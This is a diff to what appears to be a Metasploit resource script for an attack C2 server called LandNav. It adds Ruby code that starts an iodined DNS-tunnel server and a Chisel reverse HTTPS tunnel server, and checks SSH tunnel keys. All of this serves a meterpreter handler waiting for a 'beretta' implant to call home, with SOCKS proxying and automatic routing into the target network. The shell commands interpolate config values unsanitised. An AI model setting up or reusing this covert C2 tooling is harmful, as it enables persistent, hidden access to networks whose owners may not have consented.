@@ -11,26 +11,149 @@
 # Python meterpreter is single-threaded and heavy SOCKS browsing
 # (especially WebSocket/SocketIO apps) starves the command channel.
 
-# ── Pre-process auto_commands.txt ──────────────────────────────
-# LandNav's _generate_auto_commands() strips portfwd lines whose
-# local port matches an SSH tunnel port from config.yaml.  That
-# function runs on the *implant* (beretta) at startup, but
-# Metasploit reads auto_commands.txt from *this* machine (the C2 server).
-# The Ruby block below calls the same logic on the C2 server so the
-# handler sees the stripped file.
+# ── Pre-flight: auto_commands + iodined + key check ───────────
 <ruby>
-landnav_dir = '/opt/pr0t31n/LandNav'
-prep = "#{landnav_dir}/prep_handler.py"
+require 'yaml'
+require 'set'
+
+LANDNAV_DIR = '/opt/pr0t31n/LandNav'
+CONFIG_PATH = "#{LANDNAV_DIR}/config.yaml"
+
+cfg = {}
+if File.exist?(CONFIG_PATH)
+  cfg = YAML.safe_load(File.read(CONFIG_PATH)) || {}
+end
+
+# ── 1. Strip portfwd lines that overlap with SSH tunnels ──────
+prep = "#{LANDNAV_DIR}/prep_handler.py"
 if File.exist?(prep)
-  ret = system("python3 #{prep} -c #{landnav_dir}/config.yaml")
+  ret = system("python3 #{prep} -c #{CONFIG_PATH} 2>/dev/null")
   if ret
-    print_line("[*] LandNav: auto_commands.txt prepared (SSH tunnel ports stripped)")
+    print_line("[*] auto_commands.txt prepared (SSH-tunnel portfwd stripped)")
   else
-    print_line("[!] LandNav: prep_handler.py failed — using auto_commands.txt as-is")
+    print_line("[!] prep_handler.py failed — using auto_commands.txt as-is")
   end
 else
-  print_line("[*] LandNav: prep_handler.py not found — using auto_commands.txt as-is")
+  print_line("[*] prep_handler.py not found — using auto_commands.txt as-is")
 end
+
+# ── 2. SSH tunnel key verification ────────────────────────────
+tunnel_cfg = cfg['ssh_tunnels'] || {}
+key_path = tunnel_cfg['key_path'] || "#{LANDNAV_DIR}/keys/tunnel_key"
+if File.exist?(key_path)
+  print_line("[*] SSH tunnel key: #{key_path} ✓")
+  pub_path = "#{key_path}.pub"
+  if File.exist?(pub_path)
+    ak_path = File.expand_path("~/.ssh/authorized_keys")
+    pub_content = File.read(pub_path).strip
+    if File.exist?(ak_path) && File.read(ak_path).include?(pub_content.split(' ')[1])
+      print_line("[*] SSH tunnel pubkey in authorized_keys ✓")
+    else
+      print_line("[!] SSH tunnel pubkey NOT in #{ak_path}")
+      print_line("[!]   Run: cat #{pub_path} >> #{ak_path}")
+    end
+  end
+else
+  print_line("[!] SSH tunnel key missing: #{key_path}")
+  print_line("[!]   Run: ssh-keygen -t ed25519 -f #{key_path} -N ''")
+  print_line("[!]   Then push keys/ to the implant device")
+end
+
+# ── 3. Start iodined (DNS tunnel server) ─────────────────────
+dns_cfg = cfg['dns_tunnel'] || {}
+if dns_cfg.fetch('enabled', true)
+  domain = dns_cfg['domain']
+  password = dns_cfg['password']
+
+  if domain && !domain.empty? && password && !password.empty?
+    if system("command -v iodined >/dev/null 2>&1")
+      if system("pgrep -x iodined >/dev/null 2>&1")
+        print_line("[*] iodined already running ✓")
+      else
+        # Check NS delegation
+        ns_out = `dig +short NS #{domain} 2>/dev/null`.strip
+        if ns_out.empty?
+          print_line("[!] No NS delegation for #{domain}")
+          c2_host = (cfg['c2'] || {})['host'] || 'c2.example.com'
+          print_line("[!]   Add at domain registrar: #{domain}. IN NS #{c2_host}.")
+          print_line("[!]   DNS tunnel will fail until delegation is set up")
+        else
+          print_line("[*] NS delegation for #{domain}: #{ns_out}")
+        end
+
+        # Start iodined — daemon mode (no -f), backgrounds itself
+        tunnel_net = dns_cfg['tunnel_net'] || '10.53.53.1/24'
+        if system("iodined -c -P '#{password}' #{tunnel_net} #{domain} 2>/dev/null")
+          print_line("[*] iodined started: #{domain} (net #{tunnel_net})")
+        else
+          # Common cause: port 53 already in use
+          if system("ss -tlnp sport = :53 >/dev/null 2>&1")
+            in_use = `ss -tlnp sport = :53 2>/dev/null`.strip.split("\n").last
+            print_line("[!] iodined failed — port 53 in use: #{in_use}")
+          else
+            print_line("[!] iodined failed (not root? iodined not suid?)")
+          end
+        end
+      end
+    else
+      print_line("[!] iodined not installed — DNS tunnel unavailable")
+      print_line("[!]   Install: apt-get install -y iodine")
+    end
+  else
+    print_line("[*] DNS tunnel: domain/password not configured — skipping")
+  end
+else
+  print_line("[*] DNS tunnel disabled in config")
+end
+
+# ── 4. Start Chisel server (HTTPS reverse tunnel) ────────────
+chisel_cfg = cfg['chisel'] || {}
+if chisel_cfg.fetch('enabled', false)
+  if system("command -v chisel >/dev/null 2>&1")
+    if system("pgrep -xf 'chisel server' >/dev/null 2>&1")
+      print_line("[*] Chisel server already running ✓")
+    else
+      chisel_port = chisel_cfg['server_port'] || 443
+      chisel_auth = chisel_cfg['auth'] || ''
+      chisel_tls = chisel_cfg.fetch('tls', true)
+
+      chisel_cmd = "chisel server --reverse --port #{chisel_port}"
+      chisel_cmd += " --auth '#{chisel_auth}'" unless chisel_auth.empty?
+
+      if chisel_tls
+        # Chisel auto-generates a self-signed TLS cert if none provided
+        key_file = chisel_cfg['tls_key'] || ''
+        cert_file = chisel_cfg['tls_cert'] || ''
+        if !key_file.empty? && !cert_file.empty? && File.exist?(key_file)
+          chisel_cmd += " --tls-key #{key_file} --tls-cert #{cert_file}"
+        else
+          chisel_cmd += " --tls-key '' --tls-cert ''"
+        end
+      end
+
+      # Background — setsid detaches from msfconsole's process group
+      chisel_cmd += " </dev/null >/var/log/chisel.log 2>&1 &"
+      if system("setsid #{chisel_cmd}")
+        sleep(1)
+        if system("pgrep -xf 'chisel server' >/dev/null 2>&1")
+          print_line("[*] Chisel server started on :#{chisel_port} (TLS=#{chisel_tls})")
+        else
+          print_line("[!] Chisel server failed to start — check /var/log/chisel.log")
+        end
+      else
+        print_line("[!] Chisel server failed to launch")
+      end
+    end
+  else
+    print_line("[!] chisel not installed — HTTPS tunnel unavailable")
+    print_line("[!]   Install: go install github.com/jpillora/chisel@latest")
+    print_line("[!]   Or download from github.com/jpillora/chisel/releases")
+  end
+else
+  print_line("[*] Chisel disabled in config")
+end
+
+print_line("")
 </ruby>
 
 # ── SOCKS Proxy (start first so it's ready when session arrives) ──
@@ -66,14 +189,5 @@ echo "════════════════════════�
 echo " LandNav listener active on 10.20.70.172:4443"
 echo " SOCKS5 proxy on :1080 (routes through sessions)"
 echo " Waiting for beretta call-home..."
-echo ""
-echo " On session open, auto-runs:"
-echo "   • autoroute (all subnets)"
-echo "   • portfwd 25100 → beretta:5100 (Vantage)"
-echo "   • portfwd 25500 → beretta:5500 (Crucible)"
-echo "   • portfwd 28834 → beretta:8834 (Nessus)"
-echo ""
-echo " Browse: http://c2-server:25100  http://c2-server:25500"
-echo "         https://c2-server:28834"
 echo "════════════════════════════════════════════════════"
 echo ""
